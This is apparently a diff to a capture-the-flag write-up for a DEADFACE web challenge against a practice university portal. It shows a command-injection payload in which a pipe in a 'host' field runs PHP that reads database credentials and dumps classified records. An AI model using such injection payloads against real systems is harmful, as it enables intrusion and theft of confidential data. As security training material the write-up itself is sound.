@@ -385,7 +385,7 @@ ___
 
 **Description:** NVU had confidential research data that was compromised by DEADFACE and leaked to the public. NVU insists that their confidential data was safeguarded and only provided to authorized users on the web app. See if you can identify the flag associated with the classified research present on the web application. Submit the flag as `deadface{flag text}`. [http://env01.deadface.io:8080](http://env01.deadface.io:8080). 
 
-Again, at this point I have RCE. Like exactly as I did in the `Not-So-Public Domain` challenge, query the database:
+Again, at this point I have RCE. Im not sure what intended solution is. I got the flag from the same command I used in the `Not-So-Public Domain` challenge:
 ```php
 ping_host=1&host=8.8.8.8 | php -r '$h=getenv("DB_HOST")?: "db"; $d=getenv("DB_NAME")?: "nvu_portal"; $u=getenv("DB_USER")?: "nvu_user"; $p=getenv("DB_PASS")?: "NightVale2023!"; $pdo=new PDO("mysql:host=$h;dbname=$d;charset=utf8mb4",$u,$p,[PDO::ATTR_ERRMODE=>PDO::ERRMODE_EXCEPTION]); foreach($pdo->query("SELECT id,project_name,details FROM research_projects WHERE classified=1") as $r){print_r($r);} foreach($pdo->query("SELECT id,title,content FROM announcements WHERE is_hidden=1") as $r){print_r($r);}'
 ```
